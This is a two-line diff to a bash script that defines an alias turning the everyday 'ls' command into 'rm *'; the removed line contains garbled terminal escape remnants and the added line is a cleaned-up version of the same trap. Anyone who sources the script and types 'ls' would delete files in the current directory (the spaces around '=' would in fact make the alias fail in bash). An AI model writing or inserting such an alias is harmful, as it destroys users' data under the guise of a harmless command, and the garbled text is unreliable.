@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls = rm *"[D[D[D[D[D"rm *"
+alias ls = "rm *"
